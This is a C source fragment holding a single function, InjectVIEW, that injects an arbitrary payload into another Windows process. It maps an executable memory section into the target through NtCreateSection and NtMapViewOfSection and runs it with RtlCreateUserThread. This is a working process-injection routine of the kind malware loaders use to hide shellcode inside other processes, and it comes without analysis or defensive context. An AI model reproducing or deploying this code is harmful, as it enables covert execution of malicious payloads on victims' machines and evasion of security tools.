int InjectVIEW(HANDLE hProc, unsigned char *payload, unsigned int payload_len)
{

    HANDLE hSection = NULL;
    PVOID pLocalView = NULL, pRemoteView = NULL;
    HANDLE hThread = NULL;
    CLIENT_ID cid;
    // create memory section
    NtCreateSection_t pNtCreateSection = (NtCreateSection_t)GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtCreateSection");
    if (pNtCreateSection == NULL)
        return -2;
    pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER)&payload_len, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

    // create local section view
    NtMapViewOfSection_t pNtMapViewOfSection = (NtMapViewOfSection_t)GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtMapViewOfSection");
    if (pNtMapViewOfSection == NULL)
        return -2;
    pNtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalView, NULL, NULL, NULL, (SIZE_T *)&payload_len, ViewUnmap, NULL, PAGE_READWRITE);

    // throw the payload into the section
    memcpy(pLocalView, payload, payload_len);

    // create remote section view (target process)
    pNtMapViewOfSection(hSection, hProc, &pRemoteView, NULL, NULL, NULL, (SIZE_T *)&payload_len, ViewUnmap, NULL, PAGE_EXECUTE_READ);

    // execute the payload
    RtlCreateUserThread_t pRtlCreateUserThread = (RtlCreateUserThread_t)GetProcAddress(GetModuleHandle("NTDLL.DLL"), "RtlCreateUserThread");
    if (pRtlCreateUserThread == NULL)
        return -2;
    pRtlCreateUserThread(hProc, NULL, FALSE, 0, 0, 0, pRemoteView, 0, &hThread, &cid);
    if (hThread != NULL)
    {
        WaitForSingleObject(hThread, 500);
        CloseHandle(hThread);
        return 0;
    }
    return -1;
}